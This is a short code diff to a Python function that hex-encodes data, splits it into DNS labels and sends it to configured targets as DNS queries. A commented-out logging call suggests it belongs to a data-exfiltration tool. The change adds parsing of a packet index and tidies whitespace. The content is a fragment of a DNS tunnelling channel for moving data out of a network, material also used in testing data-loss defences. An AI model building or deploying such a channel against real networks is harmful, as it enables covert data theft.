@@ -67,7 +67,9 @@ def send(data):
     else:
         targets = [config['target']]
     port = config['port']
-    jobid = data.split("|!|")[0]
+    message = data.split("|!|")
+    jobid = message[0]
+    packet_index = message[1]
     data = data.encode('hex')
     domain = ""
 
@@ -77,7 +79,7 @@ def send(data):
     no_labels = rem / 64 #( 63 + len('.') )
     #Length of the last remaining label
     last_label_len = (rem % 64) - 1
-    
+
     fragment_index = 0
     while data != "":
         data = jobid + data
@@ -103,7 +105,7 @@ def send(data):
                 'info', "[DNS] Sending {0} bytes with DNS packet to {1}. PacketIndex = {2} FragementIndex = {3} ".format(len(domain), target, packet_index, fragment_index))
             q.send(target, port, timeout=0.01)
             fragment_index = fragment_index + 1
-            
+
         except Exception as e:
             print(e)
             # app_exfiltrate.log_message('warning', "[dns] Failed to send DNS request")
